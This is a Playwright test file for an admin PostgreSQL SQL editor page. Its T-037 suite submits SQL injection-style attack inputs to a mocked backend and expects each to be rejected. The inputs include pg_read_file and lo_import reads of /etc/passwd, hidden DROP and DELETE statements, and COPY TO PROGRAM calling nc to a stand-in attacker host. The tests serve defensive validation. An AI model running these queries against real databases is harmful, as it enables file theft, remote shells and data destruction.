/**
 * T-036 Playwright tests — PostgreSQL SQL Editor page
 *
 * Test cases:
 * 1. Admin loads /admin/pg-viewer/query → editor renders
 * 2. Non-admin → redirect / 403 view
 * 3. Paste `SELECT 1` + click Run → result table shows 1 row
 * 4. Paste `DROP TABLE users` + click Run → inline error banner (not dialog)
 * 5. Paste `SELECT 1; SELECT 2` → error "multi-statement not allowed"
 * 6. Mock 429 response → amber banner + Run disabled
 * 7. Mock response with truncated=true → amber warning visible
 * 8. Ctrl+Enter keybind runs the query
 * 9. CSP header: /admin/pg-viewer/query has the full CSP (regex test)
 */

import { test, expect } from '@playwright/test';

const BASE_URL = process.env.BASE_URL || 'http://localhost:3000';

// ---------------------------------------------------------------------------
// Credentials
// ---------------------------------------------------------------------------
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@example.com';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'admin';
const VIEWER_EMAIL = process.env.VIEWER_EMAIL || 'viewer@example.com';
const VIEWER_PASSWORD = process.env.VIEWER_PASSWORD || 'viewer123';

// ---------------------------------------------------------------------------
// Helper: login
// ---------------------------------------------------------------------------
async function loginAs(page: import('@playwright/test').Page, email: string, password: string) {
  await page.goto(`${BASE_URL}/login`);
  await page.fill('input[type="email"], input[name="email"]', email);
  await page.fill('input[type="password"], input[name="password"]', password);
  await page.click('button[type="submit"]');
  await page.waitForURL((url) => !url.pathname.includes('/login'), { timeout: 15000 });
}

// ---------------------------------------------------------------------------
// Helper: mock a successful SQL response
// ---------------------------------------------------------------------------
function mockSqlSuccess(
  page: import('@playwright/test').Page,
  overrides: Partial<{
    columns: { name: string; data_type: string }[];
    rows: Record<string, unknown>[];
    row_count: number;
    elapsed_ms: number;
    truncated: boolean;
  }> = {}
) {
  const body = {
    columns: overrides.columns ?? [{ name: '?column?', data_type: 'integer' }],
    rows: overrides.rows ?? [{ '?column?': 1 }],
    row_count: overrides.row_count ?? 1,
    elapsed_ms: overrides.elapsed_ms ?? 3,
    truncated: overrides.truncated ?? false,
    notice: null,
  };
  return page.route('**/api/pg-viewer/sql', (route) => {
    route.fulfill({
      status: 200,
      contentType: 'application/json',
      body: JSON.stringify(body),
    });
  });
}

// ---------------------------------------------------------------------------
// Test suite
// ---------------------------------------------------------------------------

test.describe('T-036 — PG Viewer SQL Editor', () => {

  // ── 1. Admin loads /admin/pg-viewer/query → editor renders ────────────────
  test('1. Admin: SQL editor page renders textarea and Run button', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);
    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);

    // Page heading
    await expect(page.locator('h1')).toContainText('PostgreSQL SQL Editor', { timeout: 10000 });

    // Subtitle hint
    await expect(page.getByText('SELECT-only')).toBeVisible({ timeout: 5000 });

    // Editor textarea
    await expect(page.getByTestId('sql-editor-wrapper')).toBeVisible({ timeout: 5000 });
    await expect(page.locator('textarea#sql-editor-textarea')).toBeVisible({ timeout: 5000 });

    // Run button
    await expect(page.getByTestId('run-sql-button')).toBeVisible({ timeout: 5000 });
  });

  // ── 2. Non-admin → redirect / 403 view ───────────────────────────────────
  test('2. Non-admin: viewer role is redirected away from /admin/pg-viewer/query', async ({ page }) => {
    if (VIEWER_EMAIL === 'viewer@example.com' && VIEWER_PASSWORD === 'viewer123') {
      test.skip(true, 'Viewer credentials not configured — set VIEWER_EMAIL / VIEWER_PASSWORD env vars');
    }

    await loginAs(page, VIEWER_EMAIL, VIEWER_PASSWORD);
    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);

    await page.waitForTimeout(2000);
    const url = page.url();
    expect(url).not.toContain('/admin/pg-viewer/query');
  });

  // ── 3. SELECT 1 → result table shows 1 row ───────────────────────────────
  test('3. SELECT 1 → result table with 1 row appears', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);
    await mockSqlSuccess(page);

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    await page.fill('textarea#sql-editor-textarea', 'SELECT 1');
    await page.getByTestId('run-sql-button').click();

    // Result table
    await expect(page.getByTestId('sql-result-table')).toBeVisible({ timeout: 10000 });

    // Row count badge shows "1 row"
    await expect(page.getByTestId('result-toolbar')).toContainText('1 row', { timeout: 5000 });
  });

  // ── 4. DROP TABLE → inline error banner (not alert dialog) ───────────────
  test('4. DROP TABLE → inline error banner, no alert() dialog', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

    // Mock backend refusing the DML statement
    await page.route('**/api/pg-viewer/sql', (route) => {
      route.fulfill({
        status: 400,
        contentType: 'application/json',
        body: JSON.stringify({ detail: 'Only SELECT statements are permitted' }),
      });
    });

    // Ensure no dialog pops up
    let dialogAppeared = false;
    page.on('dialog', async (dialog) => {
      dialogAppeared = true;
      await dialog.dismiss();
    });

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    await page.fill('textarea#sql-editor-textarea', 'DROP TABLE users');
    await page.getByTestId('run-sql-button').click();

    // Inline error banner must appear
    await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
    await expect(page.getByTestId('sql-error-banner')).toContainText('Only SELECT statements are permitted');

    // No dialog
    expect(dialogAppeared).toBe(false);
  });

  // ── 5. Multi-statement → error "multi-statement not allowed" ─────────────
  test('5. Multi-statement SELECT 1; SELECT 2 → inline error banner', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

    await page.route('**/api/pg-viewer/sql', (route) => {
      route.fulfill({
        status: 400,
        contentType: 'application/json',
        body: JSON.stringify({ detail: 'multi-statement not allowed' }),
      });
    });

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    await page.fill('textarea#sql-editor-textarea', 'SELECT 1; SELECT 2');
    await page.getByTestId('run-sql-button').click();

    await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
    await expect(page.getByTestId('sql-error-banner')).toContainText('multi-statement not allowed');
  });

  // ── 6. Mock 429 → amber banner + Run disabled ────────────────────────────
  test('6. 429 response → amber rate-limit banner + Run button disabled', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

    await page.route('**/api/pg-viewer/sql', (route) => {
      route.fulfill({
        status: 429,
        contentType: 'application/json',
        headers: { 'Retry-After': '30' },
        body: JSON.stringify({ detail: 'rate limit exceeded', retry_after: 30 }),
      });
    });

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    await page.fill('textarea#sql-editor-textarea', 'SELECT 1');
    await page.getByTestId('run-sql-button').click();

    // Amber rate-limit banner
    await expect(page.getByTestId('rate-limit-banner')).toBeVisible({ timeout: 10000 });
    await expect(page.getByTestId('rate-limit-banner')).toContainText('Rate limit');

    // Run button should be disabled
    const runBtn = page.getByTestId('run-sql-button');
    await expect(runBtn).toBeDisabled({ timeout: 5000 });
  });

  // ── 7. truncated=true → amber truncation warning visible ─────────────────
  test('7. truncated=true → amber LIMIT 1000 warning banner', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

    // Patch row_count to 1000 + truncated=true
    await mockSqlSuccess(page, {
      row_count: 1000,
      rows: Array.from({ length: 1 }, (_, i) => ({ id: i })),
      columns: [{ name: 'id', data_type: 'integer' }],
      truncated: true,
    });

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    await page.fill('textarea#sql-editor-textarea', 'SELECT id FROM large_table');
    await page.getByTestId('run-sql-button').click();

    await expect(page.getByTestId('truncation-warning')).toBeVisible({ timeout: 10000 });
    await expect(page.getByTestId('truncation-warning')).toContainText('LIMIT 1000 auto-appended');
  });

  // ── 8. Ctrl+Enter keybind runs the query ─────────────────────────────────
  test('8. Ctrl+Enter keybind triggers query execution', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);
    await mockSqlSuccess(page);

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    const textarea = page.locator('textarea#sql-editor-textarea');
    await textarea.fill('SELECT 1');
    await textarea.press('Control+Enter');

    // Result table should appear (same assertion as test 3)
    await expect(page.getByTestId('sql-result-table')).toBeVisible({ timeout: 10000 });
  });

  // ── 9. CSP header present on /admin/pg-viewer/query ──────────────────────
  test('9. CSP header is present and correct on /admin/pg-viewer/query', async ({ request }) => {
    const response = await request.get(`${BASE_URL}/admin/pg-viewer/query`);

    const csp = response.headers()['content-security-policy'];
    expect(csp, 'CSP header must be present on /admin/pg-viewer/query').toBeTruthy();

    // Required directives (same set as T-031 test 4)
    const required: [string, RegExp][] = [
      ["default-src 'none'", /default-src\s+'none'/],
      ["script-src nonce + strict-dynamic", /script-src\s+'self'\s+'nonce-[A-Za-z0-9+/=]{20,}'\s+'strict-dynamic'/],
      ["style-src nonce", /style-src\s+'self'\s+'nonce-[A-Za-z0-9+/=]{20,}'/],
      ["frame-ancestors 'none'", /frame-ancestors\s+'none'/],
      ["object-src 'none'", /object-src\s+'none'/],
      ["upgrade-insecure-requests", /upgrade-insecure-requests/],
    ];

    for (const [label, pattern] of required) {
      expect(csp, `Missing directive: ${label}`).toMatch(pattern);
    }

    // Must NOT contain unsafe directives
    expect(csp, "CSP must not contain 'unsafe-inline'").not.toContain("'unsafe-inline'");
    expect(csp, "CSP must not contain 'unsafe-eval'").not.toContain("'unsafe-eval'");
  });

});

// ---------------------------------------------------------------------------
// T-037 — Attack-surface E2E tests
// ---------------------------------------------------------------------------
// These tests mock the backend response (same strategy as tests 4 and 5 above)
// so they run without a live server.  Each attack SQL input causes the mocked
// backend to return a 400 detail string; the test asserts:
//   1. The inline error banner (data-testid="sql-error-banner") is visible.
//   2. The banner contains the expected detail keyword.
//   3. No native alert() dialog appeared.
// ---------------------------------------------------------------------------

/**
 * Map of attack cases used in the parametrized test below.
 * Format: [testName, sql, backendDetailKeyword, expectedBannerKeyword]
 *
 * backendDetailKeyword — the string the mocked backend puts in `detail`
 *   (mirrors what validate_select_sql actually returns).
 * expectedBannerKeyword — the substring we assert is visible in the banner.
 */
const ATTACK_CASES: Array<[string, string, string, string]> = [
  [
    'comment-hidden-drop',
    '/* hidden */ DROP TABLE users',
    'forbidden keyword: DROP',
    'forbidden keyword',
  ],
  [
    'line-comment-drop',
    '-- DROP\nSELECT 1',
    'forbidden keyword: DROP',
    'forbidden keyword',
  ],
  [
    'cte-headed-delete',
    'WITH foo AS (DELETE FROM users RETURNING *) SELECT * FROM foo',
    'forbidden keyword: DELETE',
    'forbidden keyword',
  ],
  [
    'multi-statement-semicolon',
    'SELECT 1; SELECT 2',
    'multiple statements are not allowed',
    'multiple statements',
  ],
  [
    'pg-sleep-dos',
    'SELECT pg_sleep(30)',
    'forbidden function: pg_sleep',
    'forbidden function',
  ],
  [
    'dblink-exec-oob',
    "SELECT dblink_exec('DROP TABLE users')",
    'forbidden function: dblink_exec',
    'forbidden function',
  ],
  [
    'lo-import-lfi',
    "SELECT lo_import('/etc/passwd')",
    'forbidden function: lo_import',
    'forbidden function',
  ],
  [
    'pg-read-file-lfi',
    "SELECT pg_read_file('/etc/passwd')",
    'forbidden function: pg_read_file',
    'forbidden function',
  ],
  [
    'copy-to-program-rce',
    "COPY (SELECT 1) TO PROGRAM 'nc attacker.example.com 1337'",
    'forbidden keyword: COPY',
    'forbidden keyword',
  ],
  [
    'security-label-priv',
    "SECURITY LABEL FOR provider ON TABLE x IS 'y'",
    'forbidden keyword: SECURITY',
    'forbidden keyword',
  ],
  [
    'unicode-cyrillic-select',
    'ЅELECT 1',
    'only SELECT (or WITH \u2026 SELECT) statements are allowed',
    'only SELECT',
  ],
];

test.describe('T-037 — Attack-surface inputs', () => {

  for (const [caseName, sql, backendDetail, bannerKeyword] of ATTACK_CASES) {
    test(`Attack: ${caseName} → inline error banner shows "${bannerKeyword}"`, async ({ page }) => {
      await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

      // Mock backend returning 400 with the exact detail string from validate_select_sql
      await page.route('**/api/pg-viewer/sql', (route) => {
        route.fulfill({
          status: 400,
          contentType: 'application/json',
          body: JSON.stringify({ detail: backendDetail }),
        });
      });

      // No dialog should appear
      let dialogAppeared = false;
      page.on('dialog', async (dialog) => {
        dialogAppeared = true;
        await dialog.dismiss();
      });

      await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
      await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

      // Type the attack SQL (fill handles newlines correctly)
      await page.fill('textarea#sql-editor-textarea', sql);
      await page.getByTestId('run-sql-button').click();

      // Inline error banner must appear
      await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
      await expect(page.getByTestId('sql-error-banner')).toContainText(bannerKeyword);

      // No native dialog
      expect(dialogAppeared).toBe(false);
    });
  }

  // ── Ctrl+Enter keybind on attack SQL also shows error banner ──────────────
  test('Attack via Ctrl+Enter: pg_sleep → inline error banner', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

    await page.route('**/api/pg-viewer/sql', (route) => {
      route.fulfill({
        status: 400,
        contentType: 'application/json',
        body: JSON.stringify({ detail: 'forbidden function: pg_sleep' }),
      });
    });

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    const textarea = page.locator('textarea#sql-editor-textarea');
    await textarea.fill('SELECT pg_sleep(30)');
    await textarea.press('Control+Enter');

    // Error banner via keybind — same assertion as click path
    await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });
    await expect(page.getByTestId('sql-error-banner')).toContainText('forbidden function');
  });

  // ── Error banner clears on subsequent successful run ──────────────────────
  test('Error banner clears when subsequent query succeeds', async ({ page }) => {
    await loginAs(page, ADMIN_EMAIL, ADMIN_PASSWORD);

    let callCount = 0;
    await page.route('**/api/pg-viewer/sql', (route) => {
      callCount += 1;
      if (callCount === 1) {
        // First call: attack → 400
        route.fulfill({
          status: 400,
          contentType: 'application/json',
          body: JSON.stringify({ detail: 'forbidden keyword: DROP' }),
        });
      } else {
        // Second call: valid SELECT → 200
        route.fulfill({
          status: 200,
          contentType: 'application/json',
          body: JSON.stringify({
            columns: [{ name: '?column?', data_type: 'integer' }],
            rows: [{ '?column?': 1 }],
            row_count: 1,
            elapsed_ms: 2,
            truncated: false,
            notice: null,
          }),
        });
      }
    });

    await page.goto(`${BASE_URL}/admin/pg-viewer/query`);
    await page.waitForSelector('textarea#sql-editor-textarea', { timeout: 10000 });

    // First run: attack → banner appears
    await page.fill('textarea#sql-editor-textarea', 'DROP TABLE users');
    await page.getByTestId('run-sql-button').click();
    await expect(page.getByTestId('sql-error-banner')).toBeVisible({ timeout: 10000 });

    // Second run: valid query → banner must disappear; result table appears
    await page.fill('textarea#sql-editor-textarea', 'SELECT 1');
    await page.getByTestId('run-sql-button').click();

    // Result table must appear
    await expect(page.getByTestId('sql-result-table')).toBeVisible({ timeout: 10000 });

    // Error banner must be gone (hidden or removed from DOM)
    await expect(page.getByTestId('sql-error-banner')).not.toBeVisible({ timeout: 5000 });
  });

});
